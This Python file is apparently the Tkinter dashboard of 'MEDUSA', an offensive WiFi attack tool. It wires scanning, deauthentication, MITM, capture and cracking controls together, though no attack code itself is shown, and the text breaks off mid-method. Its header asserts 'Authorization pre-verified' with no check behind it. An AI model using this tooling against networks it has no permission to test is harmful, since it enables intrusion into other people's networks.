#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    MEDUSA — Queen of Brute Force                           ║
║         Elite State-of-the-Art WiFi Assault & Packet Capture Engine        ║
║                                                                             ║
║  dashboard.py — TKinter Hacker Dashboard — GUI Control Center              ║
║                                                                             ║
║  Responsibilities:                                                          ║
║    • Full TKinter GUI with matrix-hacker aesthetic                          ║
║    • Real-time network scanning with live Treeview updates                  ║
║    • Terminal emulator with ANSI-colored log streaming via queue            ║
║    • OS-adaptive control panels (Windows ≠ Linux ≠ macOS)                   ║
║    • Threaded attack/capture/crack execution with stop/resume               ║
║    • Session save/load with visual state indicators                         ║
║    • Keyboard shortcuts for power users (Ctrl+S scan, Ctrl+A attack)        ║
║    • Fully idempotent — safe to open/close repeatedly                       ║
║                                                                             ║
║  Usage (from main.py):                                                      ║
║    python main.py --gui                          # Launch this dashboard    ║
║    python -m medusa.dashboard                    # Standalone mode          ║
║                                                                             ║
║  Authorized Penetration Testing Platform — Authorization pre-verified      ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import re
import json
import time
import queue
import signal
import atexit
import shutil
import threading
import subprocess
import traceback
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any, Callable
from dataclasses import asdict
from collections import OrderedDict

# ============================================================================
# TKinter Imports — Graceful fallback
# ============================================================================

try:
    import tkinter as tk
    from tkinter import ttk, scrolledtext, filedialog, messagebox, simpledialog
    TKINTER_AVAILABLE = True
except ImportError:
    TKINTER_AVAILABLE = False

# ============================================================================
# MEDUSA Core Imports (lazy — only when needed)
# ============================================================================

from medusa_init import (
    VERSION, CODENAME, VERSION_FULL, AUTHOR,
    SYSTEM, SYSTEM_LOWER, MACHINE, ARCH, CPU_COUNT,
    IS_WINDOWS, IS_MACOS, IS_LINUX, IS_ADMIN,
    CAN_MONITOR_MODE, CAN_INJECT_PACKETS, CAN_EXTRACT_WIFI_PROFILES,
    CAN_HASHCAT_GPU, CAN_HASHCAT_CPU, CAN_PIXIEDUST, CAN_HCXTOOLS,
    CAPTURE_DIR, SESSION_DIR, LOOT_DIR, LOG_DIR, WORDLIST_DIR, CONFIG_DIR, TEMP_DIR,
    DEFAULT_WORDLIST,
    LOGO_COMPACT, THEME, ANSI, BRANDING,
    MedusaError, InterfaceError, CaptureError, HandshakeNotFoundError,
    DeauthError, MITMError, CrackError, WordlistError, HashcatError,
    DashboardError, PermissionError_Medusa, DependencyError, SessionError,
    ensure_directories, current_timestamp, human_time, human_bytes, human_number,
    validate_mac, validate_ip, safe_filename, check_dependencies,
    LOG_LEVELS, COMMON_PORTS,
)

# ============================================================================
# HACKER THEME — Matrix-inspired color palette
# ============================================================================

HACKER_THEME = {
    "bg_dark": "#0a0a0a",
    "bg_medium": "#0d0d0d",
    "bg_light": "#111111",
    "bg_card": "#0f0f0f",
    "bg_input": "#1a1a1a",
    "bg_tree_even": "#0c0c0c",
    "bg_tree_odd": "#0f0f0f",
    "bg_selected": "#1a3a1a",
    "fg_primary": "#00ff41",       # Matrix green
    "fg_secondary": "#00cc33",
    "fg_dim": "#005522",
    "fg_bright": "#66ff99",
    "fg_white": "#cccccc",
    "fg_gray": "#666666",
    "fg_red": "#ff3333",
    "fg_yellow": "#ffaa00",
    "fg_orange": "#ff6600",
    "fg_cyan": "#00ddff",
    "fg_magenta": "#ff00ff",
    "fg_blue": "#3388ff",
    "fg_purple": "#aa66ff",
    "border": "#003300",
    "border_light": "#005500",
    "accent": "#00ff41",
    "accent_hover": "#00ff60",
    "scroll_bg": "#0a0a0a",
    "scroll_fg": "#003300",
    "scroll_active": "#005500",
    "button_bg": "#0d0d0d",
    "button_fg": "#00ff41",
    "button_active_bg": "#0f3f0f",
    "button_active_fg": "#66ff99",
    "button_disabled_fg": "#333333",
    "entry_bg": "#111111",
    "entry_fg": "#00ff41",
    "entry_insert": "#00ff41",
    "tab_bg": "#0a0a0a",
    "tab_fg": "#005522",
    "tab_selected_bg": "#0f0f0f",
    "tab_selected_fg": "#00ff41",
    "progress_bar": "#00ff41",
    "progress_bg": "#002200",
    "tooltip_bg": "#001100",
    "tooltip_fg": "#00ff41",
    "status_ready": "#00ff41",
    "status_busy": "#ffaa00",
    "status_error": "#ff3333",
    "status_success": "#00ff41",
    "log_info": "#00cc33",
    "log_ok": "#00ff41",
    "log_warn": "#ffaa00",
    "log_err": "#ff3333",
    "log_found": "#ff00ff",
    "log_debug": "#555555",
    "log_critical": "#ff0000",
    "log_deauth": "#dddd00",
    "log_mitm": "#00ddff",
    "log_hijack": "#ff6600",
}

# ============================================================================
# MEDUSA DASHBOARD — Main Application
# ============================================================================

class MedusaDashboard:
    """State-of-the-art TKinter hacker dashboard for MEDUSA.
    
    Architecture:
    ┌─────────────────────────────────────────────────────────────────┐
    │  HEADER: Logo + Version + Status Bar + Quick Actions            │
    ├──────────────────┬──────────────────────┬──────────────────────┤
    │  NETWORK TREE    │  TERMINAL OUTPUT     │  CONTROL PANEL       │
    │  (Treeview)       │  (ScrolledText log)  │  (Context-sensitive) │
    │  - SSID, BSSID   │  Real-time colored   │  Scan / Attack /     │
    │  - CH, Signal    │  log stream from     │  Capture / Crack     │
    │  - Encryption    │  engine queue         │  buttons + progress  │
    │  Right-click menu│  Auto-scroll toggle  │  Config inputs       │
    ├──────────────────┴──────────────────────┴──────────────────────┤
    │  FOOTER: Stats bar (APs, Clients, Packets, Elapsed, Ports)     │
    └─────────────────────────────────────────────────────────────────┘
    
    Threading Model:
    - UI runs on TKinter main thread (only thread safe for widget ops)
    - All network operations spawn daemon threads
    - Log queue bridges threads: engines push → root.after() polls → widget updates
    - Stop events for graceful cancellation
    
    OS Adaptation:
    - Linux: Full capabilities (monitor mode, injection, hcxtools, WPS)
    - macOS: Limited (no monitor, no injection, airport scan + profile extract)
    - Windows: netsh + pywifi + profile extract
    """
    
    # Class-level singleton for the log queue (wired to MedusaConsole)
    log_queue: queue.Queue = queue.Queue()
    
    def __init__(self, console=None):
        """Initialize the dashboard.
        
        Args:
            console: Optional MedusaConsole instance. If None, creates a new one.
        """
        if not TKINTER_AVAILABLE:
            raise DashboardError("TKinter not available. GUI mode cannot start.")
        
        self.console = console
        self._engines = {}
        self._running = threading.Event()
        self._running.set()
        self._stop_events: Dict[str, threading.Event] = {}
        self._threads: Dict[str, threading.Thread] = {}
        self._networks: List[Dict] = []
        self._selected_network: Optional[Dict] = None
        self._log_buffer: List[str] = []
        self._max_log_lines = 10000
        self._log_auto_scroll = tk.BooleanVar(value=True)
        self._dark_mode = tk.BooleanVar(value=True)
        self._scan_in_progress = False
        self._attack_in_progress = False
        self._capture_in_progress = False
        self._crack_in_progress = False
        self._session_name = f"medusa_{current_timestamp('file')}"
        
        # Wire the log queue to MedusaConsole if available
        if self.console and hasattr(self.console, 'log_queue'):
            self.console.log_queue = self.log_queue
        
        # Build the UI
        self._build_ui()
        
        # Register cleanup
        atexit.register(self._cleanup)
        
        # Start log queue poller
        self._poll_log_queue()
        
        # Start system monitor (CPU, RAM, packets)
        self._start_system_monitor()
        
        # Bind global keyboard shortcuts
        self._bind_shortcuts()
        
        # Show startup banner in terminal
        self._log_banner()
    
    # ========================================================================
    # UI BUILDING
    # ========================================================================
    
    def _build_ui(self):
        """Construct the entire dashboard UI."""
        self.root = tk.Tk()
        self.root.title(f"MEDUSA v{VERSION} ({CODENAME}) — {BRANDING['tagline']}")
        self.root.geometry("1400x900")
        self.root.minsize(1100, 700)
        
        # Set icon if available
        try:
            self.root.iconbitmap(default=os.path.join(os.path.dirname(__file__), "medusa.ico"))
        except Exception:
            pass
        
        # Configure dark theme
        self._apply_theme()
        
        # ====================================================================
        # HEADER FRAME
        # ====================================================================
        self.header_frame = tk.Frame(self.root, bg=HACKER_THEME["bg_dark"], height=60)
        self.header_frame.pack(fill=tk.X, side=tk.TOP, padx=0, pady=0)
        self.header_frame.pack_propagate(False)
        
        # Logo + Title
        self._build_header()
        
        # ====================================================================
        # MAIN CONTENT (3-column layout)
        # ====================================================================
        self.content_frame = tk.Frame(self.root, bg=HACKER_THEME["bg_dark"])
        self.content_frame.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        
        # Configure grid columns (proportional)
        self.content_frame.grid_columnconfigure(0, weight=2, uniform="col")   # Network tree
        self.content_frame.grid_columnconfigure(1, weight=3, uniform="col")   # Terminal
        self.content_frame.grid_columnconfigure(2, weight=2, uniform="col")   # Controls
        
        self.content_frame.grid_rowconfigure(0, weight=1)
        
        # LEFT: Network Tree
        self._build_network_panel(self.content_frame)
        
        # CENTER: Terminal Output
        self._build_terminal_panel(self.content_frame)
        
        # RIGHT: Control Panel
        self._build_control_panel(self.content_frame)
        
        # ====================================================================
        # FOOTER STATS BAR
        # ====================================================================
        self._build_footer()
        
        # ====================================================================
        # PROTOCOL HANDLERS
        # ====================================================================
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)
        
        # Initial scan on startup (background)
        self.root.after(500, self._auto_scan)
    
    def _apply_theme(self):
        """Apply hacker theme to root window."""
        self.root.configure(bg=HACKER_THEME["bg_dark"])
        
        # Configure ttk styles
        style = ttk.Style()
        style.theme_use("clam")
        
        # Configure all ttk widgets with dark theme
        style.configure(".", 
            background=HACKER_THEME["bg_dark"],
            foreground=HACKER_THEME["fg_primary"],
            fieldbackground=HACKER_THEME["bg_input"],
            selectbackground=HACKER_THEME["bg_selected"],
            selectforeground=HACKER_THEME["fg_bright"],
            borderwidth=0,
            focuscolor="none",
            font=("Consolas", 10),
        )
        
        # Treeview
        style.configure("Treeview",
            background=HACKER_THEME["bg_medium"],
            foreground=HACKER_THEME["fg_primary"],
            fieldbackground=HACKER_THEME["bg_medium"],
            rowheight=26,
            borderwidth=0,
            font=("Consolas", 9),
        )
        style.configure("Treeview.Heading",
            background=HACKER_THEME["bg_light"],
            foreground=HACKER_THEME["fg_secondary"],
            borderwidth=1,
            relief="flat",
            font=("Consolas", 9, "bold"),
        )
        style.map("Treeview",
            background=[("selected", HACKER_THEME["bg_selected"])],
            foreground=[("selected", HACKER_THEME["fg_bright"])],
        )
        
        # Tabs
        style.configure("TNotebook",
            background=HACKER_THEME["bg_dark"],
            borderwidth=0,
        )
        style.configure("TNotebook.Tab",
            background=HACKER_THEME["tab_bg"],
            foreground=HACKER_THEME["tab_fg"],
            borderwidth=1,
            padding=[10, 4],
            font=("Consolas", 9),
        )
        style.map("TNotebook.Tab",
            background=[("selected", HACKER_THEME["tab_selected_bg"])],
            foreground=[("selected", HACKER_THEME["tab_selected_fg"])],
        )
        
        # Buttons
        style.configure("TButton",
            background=HACKER_THEME["button_bg"],
            foreground=HACKER_THEME["button_fg"],
            borderwidth=1,
            focuscolor="none",
            font=("Consolas", 9, "bold"),
        )
        style.map("TButton",
            background=[("active", HACKER_THEME["button_active_bg"]), ("disabled", HACKER_THEME["bg_dark"])],
            foreground=[("active", HACKER_THEME["button_active_fg"]), ("disabled", HACKER_THEME["button_disabled_fg"])],
        )
        
        # Label
        style.configure("TLabel",
            background=HACKER_THEME["bg_dark"],
            foreground=HACKER_THEME["fg_primary"],
            font=("Consolas", 10),
        )
        
        # Entry
        style.configure("TEntry",
            fieldbackground=HACKER_THEME["entry_bg"],
            foreground=HACKER_THEME["entry_fg"],
            insertcolor=HACKER_THEME["entry_insert"],
            borderwidth=1,
            font=("Consolas", 10),
        )
        
        # Progressbar
        style.configure("TProgressbar",
            background=HACKER_THEME["progress_bar"],
            troughcolor=HACKER_THEME["progress_bg"],
            borderwidth=0,
        )
        
        # Scale
        style.configure("TScale",
            background=HACKER_THEME["bg_dark"],
            troughcolor=HACKER_THEME["progress_bg"],
            slidercolor=HACKER_THEME["fg_primary"],
        )
        
        # Frame
        style.configure("TFrame", background=HACKER_THEME["bg_dark"])
        style.configure("Card.TFrame", background=HACKER_THEME["bg_card"])
        
        # Labelframe
        style.configure("TLabelframe",
            background=HACKER_THEME["bg_dark"],
            foreground=HACKER_THEME["fg_primary"],
            borderwidth=1,
            relief="solid",
        )
        style.configure("TLabelframe.Label",
            background=HACKER_THEME["bg_dark"],
            foreground=HACKER_THEME["fg_secondary"],
            font=("Consolas", 9, "bold"),
        )
        
        # Combobox
        style.configure("TCombobox",
            fieldbackground=HACKER_THEME["entry_bg"],
            foreground=HACKER_THEME["entry_fg"],
            background=HACKER_THEME["bg_light"],
            arrowcolor=HACKER_THEME["fg_primary"],
            borderwidth=1,
            font=("Consolas", 10),
        )
        style.map("TCombobox",
            fieldbackground=[("readonly", HACKER_THEME["entry_bg"])],
        )
        
        # Checkbutton
        style.configure("TCheckbutton",
            background=HACKER_THEME["bg_dark"],
            foreground=HACKER_THEME["fg_primary"],
            font=("Consolas", 9),
        )
        style.map("TCheckbutton",
            background=[("active", HACKER_THEME["bg_medium"])],
        )
        
        # Scrollbar
        style.configure("TScrollbar",
            background=HACKER_THEME["scroll_bg"],
            troughcolor=HACKER_THEME["bg_dark"],
            bordercolor=HACKER_THEME["border"],
            arrowcolor=HACKER_THEME["fg_primary"],
            borderwidth=0,
        )
        style.map("TScrollbar",
            background=[("active", HACKER_THEME["scroll_active"])],
        )
    
    def _build_header(self):
        """Build the header with logo, version, and quick-action buttons."""
        # Left: Logo ASCII
        logo_text = """
    ███╗   ███╗███████╗██████╗ ██╗   ██╗███████╗ █████╗ 
    ████╗ ████║██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
    ██╔████╔██║█████╗  ██║  ██║██║   ██║███████╗███████║
    ██║╚██╔╝██║██╔══╝  ██║  ██║██║   ██║╚════██║██╔══██║
    ██║ ╚═╝ ██║███████╗██████╔╝╚██████╔╝███████║██║  ██║
    ╚═╝     ╚═╝╚══════╝╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
        """
        
        logo_label = tk.Label(
            self.header_frame,
            text=logo_text,
            font=("Courier New", 7),
            fg=HACKER_THEME["fg_primary"],
            bg=HACKER_THEME["bg_dark"],
            justify=tk.LEFT,
        )
        logo_label.pack(side=tk.LEFT, padx=(10, 20), pady=2)
        
        # Center: Title + Version
        title_frame = tk.Frame(self.header_frame, bg=HACKER_THEME["bg_dark"])
        title_frame.pack(side=tk.LEFT, fill=tk.X, expand=True, pady=2)
        
        title_label = tk.Label(
            title_frame,
            text=f"MEDUSA v{VERSION} — {CODENAME}",
            font=("Consolas", 14, "bold"),
            fg=HACKER_THEME["fg_bright"],
            bg=HACKER_THEME["bg_dark"],
            anchor=tk.W,
        )
        title_label.pack(anchor=tk.W)
        
        tagline_label = tk.Label(
            title_frame,
            text=f"▸ {BRANDING['tagline']}",
            font=("Consolas", 9),
            fg=HACKER_THEME["fg_dim"],
            bg=HACKER_THEME["bg_dark"],
            anchor=tk.W,
        )
        tagline_label.pack(anchor=tk.W)
        
        # Right: Quick action buttons
        actions_frame = tk.Frame(self.header_frame, bg=HACKER_THEME["bg_dark"])
        actions_frame.pack(side=tk.RIGHT, padx=10, pady=4)
        
        self.btn_scan_header = tk.Button(
            actions_frame,
            text="⚡ SCAN",
            font=("Consolas", 9, "bold"),
            bg=HACKER_THEME["button_bg"],
            fg=HACKER_THEME["button_fg"],
            activebackground=HACKER_THEME["button_active_bg"],
            activeforeground=HACKER_THEME["button_active_fg"],
            bd=1,
            relief="solid",
            highlightbackground=HACKER_THEME["border"],
            cursor="hand2",
            command=self._start_scan,
        )
        self.btn_scan_header.pack(side=tk.LEFT, padx=2)
        
        # Platform badge
        platform_colors = {
            "Linux": "#ffaa00",
            "Windows": "#3388ff",
            "Darwin": "#888888",
        }
        os_color = platform_colors.get(SYSTEM, "#00ff41")
        
        platform_label = tk.Label(
            actions_frame,
            text=f" {SYSTEM} ",
            font=("Consolas", 8, "bold"),
            fg=os_color,
            bg=HACKER_THEME["bg_medium"],
            bd=1,
            relief="solid",
            highlightbackground=HACKER_THEME["border"],
        )
        platform_label.pack(side=tk.LEFT, padx=4)
        
        admin_label = tk.Label(
            actions_frame,
            text=" ADMIN " if IS_ADMIN else " USER ",
            font=("Consolas", 8, "bold"),
            fg=HACKER_THEME["fg_red"] if IS_ADMIN else HACKER_THEME["fg_yellow"],
            bg=HACKER_THEME["bg_medium"],
            bd=1,
            relief="solid",
            highlightbackground=HACKER_THEME["border"],
        )
        admin_label.pack(side=tk.LEFT, padx=2)
        
        # Close button
        close_btn = tk.Button(
            actions_frame,
            text="✕",
            font=("Consolas", 10, "bold"),
            bg=HACKER_THEME["bg_dark"],
            fg=HACKER_THEME["fg_red"],
            activebackground=HACKER_THEME["button_active_bg"],
            activeforeground=HACKER_THEME["fg_red"],
            bd=0,
            cursor="hand2",
            command=self._on_close,
        )
        close_btn.pack(side=tk.LEFT, padx=(10, 0))
    
    def _build_network_panel(self, parent):
        """Build the left panel — network Treeview with search and stats."""
        # Container frame
        net_frame = tk.Frame(parent, bg=HACKER_THEME["bg_dark"], bd=1, relief="solid", highlightbackground=HACKER_THEME["border"])
        net_frame.grid(row=0, column=0, sticky="nsew", padx=2, pady=2)
        
        # Panel header
        net_header = tk.Frame(net_frame, bg=HACKER_THEME["bg_medium"])
        net_header.pack(fill=tk.X, side=tk.TOP)
        
        tk.Label(
            net_header,
            text="📡 NETWORKS",
            font=("Consolas", 10, "bold"),
            fg=HACKER_THEME["fg_primary"],
            bg=HACKER_THEME["bg_medium"],
        ).pack(side=tk.LEFT, padx=8, pady=4)
        
        self.net_count_label = tk.Label(
            net_header,
            text="0 APs",
            font=("Consolas", 9),
            fg=HACKER_THEME["fg_dim"],
            bg=HACKER_THEME["bg_medium"],
        )
        self.net_count_label.pack(side=tk.RIGHT, padx=8, pady=4)
        
        # Search bar
        search_frame = tk.Frame(net_frame, bg=HACKER_THEME["bg_dark"])
        search_frame.pack(fill=tk.X, side=tk.TOP, padx=4, pady=2)
        
        tk.Label(
            search_frame,
            text="🔍",
            font=("Consolas", 10),
            fg=HACKER_THEME["fg_dim"],
            bg=HACKER_THEME["bg_dark"],
        ).pack(side=tk.LEFT, padx=(4, 2))
        
        self.search_var = tk.StringVar()
        self.search_var.trace("w", lambda *_: self._filter_networks())
        
        search_entry = tk.Entry(
            search_frame,
            textvariable=self.search_var,
            font=("Consolas", 10),
            bg=HACKER_THEME["entry_bg"],
            fg=HACKER_THEME["entry_fg"],
            insertbackground=HACKER_THEME["entry_insert"],
            bd=1,
            relief="solid",
            highlightbackground=HACKER_THEME["border"],
        )
        search_entry.pack(fill=tk.X, expand=True, side=tk.LEFT, padx=2)
        search_entry.insert(0, "")
        
        # Treeview with scrollbars
        tree_container = tk.Frame(net_frame, bg=HACKER_THEME["bg_dark"])
        tree_container.pack(fill=tk.BOTH, expand=True, padx=4, pady=2)
        
        # Vertical scrollbar
        v_scroll = tk.Scrollbar(tree_container, orient=tk.VERTICAL, 
                                 bg=HACKER_THEME["scroll_bg"],
                                 troughcolor=HACKER_THEME["bg_dark"],
                                 activebackground=HACKER_THEME["scroll_active"])
        v_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Horizontal scrollbar
        h_scroll = tk.Scrollbar(tree_container, orient=tk.HORIZONTAL,
                                 bg=HACKER_THEME["scroll_bg"],
                                 troughcolor=HACKER_THEME["bg_dark"],
                                 activebackground=HACKER_THEME["scroll_active"])
        h_scroll.pack(side=tk.BOTTOM, fill=tk.X)
        
        # The Treeview
        columns = ("ssid", "bssid", "ch", "signal", "encryption", "wps", "clients")
        self.net_tree = ttk.Treeview(
            tree_container,
            columns=columns,
            show="headings",
            yscrollcommand=v_scroll.set,
            xscrollcommand=h_scroll.set,
            selectmode="browse",
            height=12,
        )
        
        # Define column headings
        column_configs = [
            ("ssid", "SSID", 180, tk.W),
            ("bssid", "BSSID", 140, tk.W),
            ("ch", "CH", 40, tk.CENTER),
            ("signal", "Signal", 100, tk.CENTER),
            ("encryption", "Encryption", 100, tk.CENTER),
            ("wps", "WPS", 50, tk.CENTER),
            ("clients", "Clients", 60, tk.CENTER),
        ]
        
        for col_id, col_text, col_width, col_anchor in column_configs:
            self.net_tree.heading(col_id, text=col_text, anchor=col_anchor,
                                 command=lambda c=col_id: self._sort_treeview(c))
            self.net_tree.column(col_id, width=col_width, minwidth=30, anchor=col_anchor)
        
        self.net_tree.pack(fill=tk.BOTH, expand=True)
        
        # Configure scrollbars
        v_scroll.config(command=self.net_tree.yview)
        h_scroll.config(command=self.net_tree.xview)
        
        # Alternate row colors via tags
        self.net_tree.tag_configure("even", background=HACKER_THEME["bg_tree_even"], foreground=HACKER_THEME["fg_primary"])
        self.net_tree.tag_configure("odd", background=HACKER_THEME["bg_tree_odd"], foreground=HACKER_THEME["fg_primary"])
        self.net_tree.tag_configure("selected", background=HACKER_THEME["bg_selected"], foreground=HACKER_THEME["fg_bright"])
        self.net_tree.tag_configure("open", foreground=HACKER_THEME["fg_red"])
        self.net_tree.tag_configure("wep", foreground=HACKER_THEME["fg_orange"])
        self.net_tree.tag_configure("wpa", foreground=HACKER_THEME["fg_yellow"])
        self.net_tree.tag_configure("wpa2", foreground=HACKER_THEME["fg_cyan"])
        self.net_tree.tag_configure("wpa3", foreground=HACKER_THEME["fg_magenta"])
        self.net_tree.tag_configure("signal_high", foreground=HACKER_THEME["fg_green"])
        self.net_tree.tag_configure("signal_med", foreground=HACKER_THEME["fg_yellow"])
        self.net_tree.tag_configure("signal_low", foreground=HACKER_THEME["fg_red"])
        
        # Bind selection event
        self.net_tree.bind("<<TreeviewSelect>>", self._on_network_select)
        self.net_tree.bind("<Button-3>", self._on_right_click)  # Right-click menu
        
        # Bottom stats
        stats_frame = tk.Frame(net_frame, bg=HACKER_THEME["bg_medium"])
        stats_frame.pack(fill=tk.X, side=tk.BOTTOM, padx=0, pady=0)
        
        self.net_stats_label = tk.Label(
            stats_frame,
            text="⏳ No scan data",
            font=("Consolas", 8),
            fg=HACKER_THEME["fg_dim"],
            bg=HACKER_THEME["bg_medium"],
            anchor=tk.W,
        )
        self.net_stats_label.pack(fill=tk.X, padx=8, pady=2)
        
        # Store reference for signal bar drawing (we'll use text-based bars)
        self._network_items = {}  # iid -> network dict
    
    def _build_terminal_panel(self, parent):
        """Build the center panel — terminal emulator with colored log output."""
        term_frame = tk.Frame(parent, bg=HACKER_THEME["bg_dark"], bd=1, relief="solid", highlightbackground=HACKER_THEME["border"])
        term_frame.grid(row=0, column=1, sticky="nsew", padx=2, pady=2)
        
        # Panel header
        term_header = tk.Frame(term_frame, bg=HACKER_THEME["bg_medium"])
        term_header.pack(fill=tk.X, side=tk.TOP)
        
        tk.Label(
            term_header,
            text="⬡ TERMINAL",
            font=("Consolas", 10, "bold"),
            fg=HACKER_THEME["fg_primary"],
            bg=HACKER_THEME["bg_medium"],
        ).pack(side=tk.LEFT, padx=8, pady=4)
        
        # Auto-scroll toggle
        self.auto_scroll_cb = tk.Checkbutton(
            term_header,
            text="Auto-scroll",
            variable=self._log_auto_scroll,
            font=("Consolas", 8),
            fg=HACKER_THEME["fg_dim"],
            bg=HACKER_THEME["bg_medium"],
            selectcolor=HACKER_THEME["bg_dark"],
            activebackground=HACKER_THEME["bg_medium"],
            activeforeground=HACKER_THEME["fg_primary"],
        )
        self.auto_scroll_cb.pack(side=tk.RIGHT, padx=8, pady=4)
        
        # Clear button
        clear_btn = tk.Button(
            term_header,
            text="Clear",
            font=("Consolas", 8),
            bg=HACKER_THEME["button_bg"],
            fg=HACKER_THEME["button_fg"],
            activebackground=HACKER_THEME["button_active_bg"],
            activeforeground=HACKER_THEME["button_active_fg"],
            bd=1,
            relief="solid",
            highlightbackground=HACKER_THEME["border"],
            cursor="hand2",
            command=self._clear_terminal,
        )
        clear_btn.pack(side=tk.RIGHT, padx=4, pady=4)
        
        # Terminal log text widget
        log_container = tk.Frame(term_frame, bg=HACKER_THEME["bg_dark"])
        log_container.pack(fill=tk.BOTH, expand=True, padx=4, pady=2)
        
        # Scrollbar
        log_scroll = tk.Scrollbar(log_container, orient=tk.VERTICAL,
                                   bg=HACKER_THEME["scroll_bg"],
                                   troughcolor=HACKER_THEME["bg_dark"],
                                   activebackground=HACKER_THEME["scroll_active"])
        log_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Text widget
        self.log_text = tk.Text(
            log_container,
            font=("Consolas", 9),
            bg=HACKER_THEME["bg_dark"],
            fg=HACKER_THEME["fg_primary"],
            insertbackground=HACKER_THEME["entry_insert"],
            bd=0,
            relief="flat",
            wrap=tk.WORD,
            yscrollcommand=log_scroll.set,
            state=tk.DISABLED,
            highlightthickness=0,
            padx=6,
            pady=4,
        )
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        log_scroll.config(command=self.log_text.yview)
        
        # Define log level color tags
        self._setup_log_tags()
        
        # Status line at bottom of terminal
        self.term_status_label = tk.Label(
            term_frame,
            text="Ready.",
            font=("Consolas", 8),
            fg=HACKER_THEME["fg_dim"],
            bg=HACKER_THEME["bg_medium"],
            anchor=tk.W,
        )
        self.term_status_label.pack(fill=tk.X, side=tk.BOTTOM, padx=8, pady=2)
    
    def _setup_log_tags(self):
        """Configure text tags for log level coloring."""
        tag_configs = {
            "log_info": HACKER_THEME["log_info"],
            "log_ok": HACKER_THEME["log_ok"],
            "log_warn": HACKER_THEME["log_warn"],
            "log_err": HACKER_THEME["log_err"],
            "log_found": HACKER_THEME["log_found"],
            "log_debug": HACKER_THEME["log_debug"],
            "log_critical": HACKER_THEME["log_critical"],
            "log_deauth": HACKER_THEME["log_deauth"],
            "log_mitm": HACKER_THEME["log_mitm"],
            "log_hijack": HACKER_THEME["log_hijack"],
            "log_banner": HACKER_THEME["fg_cyan"],
            "log_success": HACKER_THEME["fg_bright"],
            "log_header": HACKER_THEME["fg_secondary"],
            "log_dim": HACKER_THEME["fg_dim"],
            "log_white": HACKER_THEME["fg_white"],
        }
        
        for tag, color in tag_configs.items():
            self.log_text.tag_configure(tag, foreground=color)
        
        # Timestamp dim
        self.log_text.tag_configure("timestamp", foreground=HACKER_THEME["fg_dim"])
        self.log_text.tag_configure("bold", font=("Consolas", 9, "bold"))
    
    def _build_control_panel(self, parent):
        """Build the right panel — context-sensitive control buttons and config."""
        control_frame = tk.Frame(parent, bg=HACKER_THEME["bg_dark"], bd=1, relief="solid", highlightbackground=HACKER_THEME["border"])
        control_frame.grid(row=0, column=2, sticky="nsew", padx=2, pady=2)
        
        # Panel header
        ctrl_header = tk.Frame(control_frame, bg=HACKER_THEME["bg_medium"])
        ctrl_header.pack(fill=tk.X, side=tk.TOP)
        
        tk.Label(
            ctrl_header,
            text="🎛 CONTROLS",
            font=("Consolas", 10, "bold"),
            fg=HACKER_THEME["fg_primary"],
            bg=HACKER_THEME["bg_medium"],
        ).pack(side=tk.LEFT, padx=8, pady=4)
        
        # Scrollable control area
        canvas_container = tk.Frame(control_frame, bg=HACKER_THEME["bg_dark"])
        canvas_container.pack(fill=tk.BOTH, expand=True)
        
        canvas = tk.Canvas(
            canvas_container,
            bg=HACKER_THEME["bg_dark"],
            bd=0,
            highlightthickness=0,
        )
        scrollbar = tk.Scrollbar(
            canvas_container,
            orient=tk.VERTICAL,
            command=canvas.yview,
            bg=HACKER_THEME["scroll_bg"],
            troughcolor=HACKER_THEME["bg_dark"],
            activebackground=HACKER_THEME["scroll_active"],
        )
        
        self.controls_inner = tk.Frame(canvas, bg=HACKER_THEME["bg_dark"])
        self.controls_inner.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        
        canvas.create_window((0, 0), window=self.controls_inner, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Bind mousewheel to canvas
        def _on_mousewheel(event):
            canvas.yview_scroll(int(-1 * (event.delta / 120)), "units")
        canvas.bind_all("<MouseWheel>", _on_mousewheel, add="+")
        
        # ====================================================================
        # BUILD CONTROL SECTIONS
        # ====================================================================
        
        # --- TARGET INFO SECTION ---
        self._build_target_section(self.controls_inner)
        
        # --- SCAN CONTROLS ---
        self._build_scan_controls(self.controls_inner)
        
        # --- ATTACK CONTROLS ---
        self._build_attack_controls(self.controls_inner)
        
        # --- CAPTURE CONTROLS ---
        self._build_capture_controls(self.controls_inner)
        
        # --- CRACK CONTROLS ---
        self._build_crack_controls(self.controls_inner)
        
        # --- OS-SPECIFIC TOOLS ---
        self._build_os_tools(self.controls_inner)
        
        # --- SESSION CONTROLS ---
        self._build_session_controls(self.controls_inner)
        
        # ====================================================================
        # OPERATION STATUS at bottom
        # ====================================================================
        status_sep = tk.Frame(control_frame, bg=HACKER_THEME["border"], height=1)
        status_sep.pack(fill=tk.X, side=tk.BOTTOM)
        
        self.op_status_label = tk.Label(
            control_frame,
            text="● Ready",
            font=("Consolas", 9, "bold"),
            fg=HACKER_THEME["status_ready"],
            bg=HACKER_THEME["bg_dark"],
            anchor=tk.W,
        )
        self.op_status_label.pack(fill=tk.X, side=tk.BOTTOM, padx=8, pady=4)
        
        self.op_progress = ttk.Progressbar(
            control_frame,
            mode="indeterminate",
            length=200,
        )
        self.op_progress.pack(fill=tk.X, side=tk.BOTTOM, padx=8, pady=(0, 4))
        self.op_progress.pack_forget()  # Hidden until needed
    
    def _build_target_section(self, parent):
        """Build target information section."""
        frame = tk.Frame(parent, bg=HACKER_THEME["bg_card"], bd=1, relief="solid", highlightbackground=HACKER_THEME["border"])
        frame.pack(fill=tk.X, padx=6, pady=6)
        
        tk.Label(
            frame,
            text="TARGET",
            font=("Consolas", 9, "bold"),
            fg=HACKER_THEME["fg_secondary"],
            bg=HACKER_THEME["bg_card"],
        ).pack(anchor=tk.W, padx=6, pady=(4, 2))
        
        # SSID
